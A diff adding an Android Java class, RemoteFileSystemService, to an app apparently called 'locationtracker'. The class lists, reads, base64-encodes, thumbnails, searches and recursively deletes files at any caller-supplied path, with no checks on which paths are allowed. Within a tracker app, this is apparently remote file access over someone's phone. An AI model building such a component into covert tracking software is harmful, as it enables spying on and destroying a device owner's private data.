@@ -1,0 +1,425 @@
+package com.example.locationtracker;
+
+import android.content.Context;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.media.ThumbnailUtils;
+import android.os.Environment;
+import android.provider.MediaStore;
+import android.util.Base64;
+import android.util.Log;
+import android.webkit.MimeTypeMap;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+import java.io.*;
+import java.nio.file.Files;
+import java.text.SimpleDateFormat;
+import java.util.*;
+
+public class RemoteFileSystemService {
+    private static final String TAG = "RemoteFileSystem";
+    private static final int THUMBNAIL_SIZE = 200;
+
+    private final Context context;
+    private final SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+
+    public RemoteFileSystemService(Context context) {
+        this.context = context;
+    }
+
+    // Получение списка директорий и файлов
+    public JSONObject getDirectoryListing(String path) {
+        JSONObject result = new JSONObject();
+
+        try {
+            File directory = new File(path.isEmpty() ? Environment.getExternalStorageDirectory().getAbsolutePath() : path);
+
+            if (!directory.exists() || !directory.canRead()) {
+                result.put("error", "Directory not accessible");
+                return result;
+            }
+
+            JSONArray folders = new JSONArray();
+            JSONArray files = new JSONArray();
+
+            File[] contents = directory.listFiles();
+            if (contents != null) {
+                Arrays.sort(contents, (f1, f2) -> {
+                    if (f1.isDirectory() && !f2.isDirectory()) return -1;
+                    if (!f1.isDirectory() && f2.isDirectory()) return 1;
+                    return f1.getName().compareToIgnoreCase(f2.getName());
+                });
+
+                for (File item : contents) {
+                    try {
+                        if (item.isDirectory()) {
+                            folders.put(createDirectoryObject(item));
+                        } else {
+                            files.put(createFileObject(item));
+                        }
+                    } catch (Exception e) {
+                        Log.w(TAG, "Skipping inaccessible item: " + item.getName());
+                    }
+                }
+            }
+
+            result.put("currentPath", directory.getAbsolutePath());
+            result.put("parentPath", directory.getParent());
+            result.put("folders", folders);
+            result.put("files", files);
+            result.put("totalItems", contents != null ? contents.length : 0);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error listing directory: " + path, e);
+            try {
+                result.put("error", "Failed to list directory: " + e.getMessage());
+            } catch (JSONException ignored) {}
+        }
+
+        return result;
+    }
+
+    private JSONObject createDirectoryObject(File directory) throws JSONException {
+        JSONObject dirObj = new JSONObject();
+        dirObj.put("name", directory.getName());
+        dirObj.put("path", directory.getAbsolutePath());
+        dirObj.put("type", "directory");
+        dirObj.put("lastModified", dateFormat.format(new Date(directory.lastModified())));
+        dirObj.put("canRead", directory.canRead());
+        dirObj.put("canWrite", directory.canWrite());
+
+        // Подсчет файлов в директории
+        File[] contents = directory.listFiles();
+        dirObj.put("itemCount", contents != null ? contents.length : 0);
+
+        return dirObj;
+    }
+
+    private JSONObject createFileObject(File file) throws JSONException {
+        JSONObject fileObj = new JSONObject();
+        fileObj.put("name", file.getName());
+        fileObj.put("path", file.getAbsolutePath());
+        fileObj.put("type", "file");
+        fileObj.put("size", file.length());
+        fileObj.put("sizeFormatted", formatFileSize(file.length()));
+        fileObj.put("lastModified", dateFormat.format(new Date(file.lastModified())));
+        fileObj.put("canRead", file.canRead());
+        fileObj.put("canWrite", file.canWrite());
+        fileObj.put("mimeType", getMimeType(file.getName()));
+        fileObj.put("extension", getFileExtension(file.getName()));
+        fileObj.put("isImage", isImageFile(file.getName()));
+        fileObj.put("isVideo", isVideoFile(file.getName()));
+        fileObj.put("isDocument", isDocumentFile(file.getName()));
+
+        return fileObj;
+    }
+
+    // Получение содержимого файла (для текстовых файлов или превью)
+    public JSONObject getFileContent(String filePath, String mode) {
+        JSONObject result = new JSONObject();
+
+        try {
+            File file = new File(filePath);
+            if (!file.exists() || !file.canRead()) {
+                result.put("error", "File not accessible");
+                return result;
+            }
+
+            switch (mode) {
+                case "thumbnail":
+                    return generateThumbnail(file);
+                case "text":
+                    return getTextContent(file);
+                case "base64":
+                    return getBase64Content(file);
+                case "info":
+                    return getFileInfo(file);
+                default:
+                    result.put("error", "Unknown mode");
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting file content", e);
+            try {
+                result.put("error", e.getMessage());
+            } catch (JSONException ignored) {}
+        }
+
+        return result;
+    }
+
+    private JSONObject generateThumbnail(File file) throws JSONException {
+        JSONObject result = new JSONObject();
+
+        try {
+            Bitmap thumbnail = null;
+            String fileName = file.getName().toLowerCase();
+
+            if (isImageFile(fileName)) {
+                BitmapFactory.Options options = new BitmapFactory.Options();
+                options.inSampleSize = 4; // Уменьшаем размер для экономии памяти
+                Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath(), options);
+
+                if (bitmap != null) {
+                    thumbnail = ThumbnailUtils.extractThumbnail(bitmap, THUMBNAIL_SIZE, THUMBNAIL_SIZE);
+                    bitmap.recycle();
+                }
+            } else if (isVideoFile(fileName)) {
+                thumbnail = ThumbnailUtils.createVideoThumbnail(file.getAbsolutePath(), MediaStore.Images.Thumbnails.MINI_KIND);
+                if (thumbnail != null) {
+                    thumbnail = ThumbnailUtils.extractThumbnail(thumbnail, THUMBNAIL_SIZE, THUMBNAIL_SIZE);
+                }
+            }
+
+            if (thumbnail != null) {
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                thumbnail.compress(Bitmap.CompressFormat.JPEG, 70, baos);
+                String base64Thumbnail = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+
+                result.put("thumbnail", "data:image/jpeg;base64," + base64Thumbnail);
+                result.put("width", thumbnail.getWidth());
+                result.put("height", thumbnail.getHeight());
+
+                thumbnail.recycle();
+                baos.close();
+            } else {
+                result.put("error", "Cannot generate thumbnail");
+            }
+
+        } catch (Exception e) {
+            result.put("error", "Thumbnail generation failed: " + e.getMessage());
+        }
+
+        return result;
+    }
+
+    private JSONObject getTextContent(File file) throws JSONException {
+        JSONObject result = new JSONObject();
+
+        try {
+            if (file.length() > 1024 * 1024) { // Ограничение 1MB для текстовых файлов
+                result.put("error", "File too large for text preview");
+                return result;
+            }
+
+            StringBuilder content = new StringBuilder();
+            BufferedReader reader = new BufferedReader(new FileReader(file));
+            String line;
+            int lineCount = 0;
+
+            while ((line = reader.readLine()) != null && lineCount < 100) { // Максимум 100 строк
+                content.append(line).append("\n");
+                lineCount++;
+            }
+            reader.close();
+
+            result.put("content", content.toString());
+            result.put("lineCount", lineCount);
+            result.put("encoding", "UTF-8");
+
+        } catch (Exception e) {
+            result.put("error", "Failed to read text content: " + e.getMessage());
+        }
+
+        return result;
+    }
+
+    private JSONObject getBase64Content(File file) throws JSONException {
+        JSONObject result = new JSONObject();
+
+        try {
+            if (file.length() > 5 * 1024 * 1024) { // Ограничение 5MB
+                result.put("error", "File too large for base64 encoding");
+                return result;
+            }
+
+            FileInputStream fis = new FileInputStream(file);
+            byte[] buffer = new byte[(int) file.length()];
+            fis.read(buffer);
+            fis.close();
+
+            String base64Content = Base64.encodeToString(buffer, Base64.NO_WRAP);
+            result.put("content", base64Content);
+            result.put("mimeType", getMimeType(file.getName()));
+
+        } catch (Exception e) {
+            result.put("error", "Failed to encode file: " + e.getMessage());
+        }
+
+        return result;
+    }
+
+    private JSONObject getFileInfo(File file) throws JSONException {
+        JSONObject result = new JSONObject();
+
+        result.put("name", file.getName());
+        result.put("path", file.getAbsolutePath());
+        result.put("size", file.length());
+        result.put("sizeFormatted", formatFileSize(file.length()));
+        result.put("lastModified", dateFormat.format(new Date(file.lastModified())));
+        result.put("canRead", file.canRead());
+        result.put("canWrite", file.canWrite());
+        result.put("isHidden", file.isHidden());
+        result.put("mimeType", getMimeType(file.getName()));
+
+        return result;
+    }
+
+    // Удаление файлов/папок
+    public JSONObject deleteItem(String path) {
+        JSONObject result = new JSONObject();
+
+        try {
+            File item = new File(path);
+            if (!item.exists()) {
+                result.put("error", "Item does not exist");
+                return result;
+            }
+
+            boolean deleted;
+            if (item.isDirectory()) {
+                deleted = deleteDirectory(item);
+            } else {
+                deleted = item.delete();
+            }
+
+            result.put("success", deleted);
+            if (!deleted) {
+                result.put("error", "Failed to delete item");
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error deleting item", e);
+            try {
+                result.put("error", e.getMessage());
+            } catch (JSONException ignored) {}
+        }
+
+        return result;
+    }
+
+    private boolean deleteDirectory(File directory) {
+        File[] contents = directory.listFiles();
+        if (contents != null) {
+            for (File file : contents) {
+                if (file.isDirectory()) {
+                    deleteDirectory(file);
+                } else {
+                    file.delete();
+                }
+            }
+        }
+        return directory.delete();
+    }
+
+    // Поиск файлов
+    public JSONObject searchFiles(String query, String rootPath, boolean includeContent) {
+        JSONObject result = new JSONObject();
+
+        try {
+            File rootDir = new File(rootPath.isEmpty() ? Environment.getExternalStorageDirectory().getAbsolutePath() : rootPath);
+            List<File> foundFiles = new ArrayList<>();
+
+            searchInDirectory(rootDir, query.toLowerCase(), foundFiles, includeContent);
+
+            JSONArray results = new JSONArray();
+            for (File file : foundFiles) {
+                results.put(createFileObject(file));
+            }
+
+            result.put("results", results);
+            result.put("count", foundFiles.size());
+            result.put("query", query);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error searching files", e);
+            try {
+                result.put("error", e.getMessage());
+            } catch (JSONException ignored) {}
+        }
+
+        return result;
+    }
+
+    private void searchInDirectory(File directory, String query, List<File> results, boolean includeContent) {
+        if (!directory.canRead()) return;
+
+        File[] contents = directory.listFiles();
+        if (contents == null) return;
+
+        for (File item : contents) {
+            try {
+                if (item.isDirectory()) {
+                    if (item.getName().toLowerCase().contains(query)) {
+                        results.add(item);
+                    }
+                    searchInDirectory(item, query, results, includeContent);
+                } else {
+                    if (item.getName().toLowerCase().contains(query)) {
+                        results.add(item);
+                    } else if (includeContent && isTextFile(item.getName()) && item.length() < 1024 * 1024) {
+                        // Поиск по содержимому для текстовых файлов
+                        if (searchInFileContent(item, query)) {
+                            results.add(item);
+                        }
+                    }
+                }
+            } catch (Exception e) {
+                // Пропускаем недоступные файлы
+            }
+        }
+    }
+
+    private boolean searchInFileContent(File file, String query) {
+        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (line.toLowerCase().contains(query)) {
+                    return true;
+                }
+            }
+        } catch (Exception e) {
+            // Игнорируем ошибки чтения
+        }
+        return false;
+    }
+
+    // Вспомогательные методы
+    private String formatFileSize(long bytes) {
+        if (bytes < 1024) return bytes + " B";
+        if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
+        if (bytes < 1024 * 1024 * 1024) return String.format("%.1f MB", bytes / (1024.0 * 1024));
+        return String.format("%.1f GB", bytes / (1024.0 * 1024 * 1024));
+    }
+
+    private String getMimeType(String fileName) {
+        String extension = getFileExtension(fileName);
+        return MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
+    }
+
+    private String getFileExtension(String fileName) {
+        int lastDot = fileName.lastIndexOf('.');
+        return lastDot > 0 ? fileName.substring(lastDot + 1).toLowerCase() : "";
+    }
+
+    private boolean isImageFile(String fileName) {
+        String ext = getFileExtension(fileName);
+        return Arrays.asList("jpg", "jpeg", "png", "gif", "bmp", "webp").contains(ext);
+    }
+
+    private boolean isVideoFile(String fileName) {
+        String ext = getFileExtension(fileName);
+        return Arrays.asList("mp4", "avi", "mkv", "mov", "wmv", "flv", "webm").contains(ext);
+    }
+
+    private boolean isDocumentFile(String fileName) {
+        String ext = getFileExtension(fileName);
+        return Arrays.asList("pdf", "doc", "docx", "txt", "rtf", "xls", "xlsx", "ppt", "pptx").contains(ext);
+    }
+
+    private boolean isTextFile(String fileName) {
+        String ext = getFileExtension(fileName);
+        return Arrays.asList("txt", "log", "md", "json", "xml", "html", "css", "js", "java", "py", "c", "cpp").contains(ext);
+    }
+}
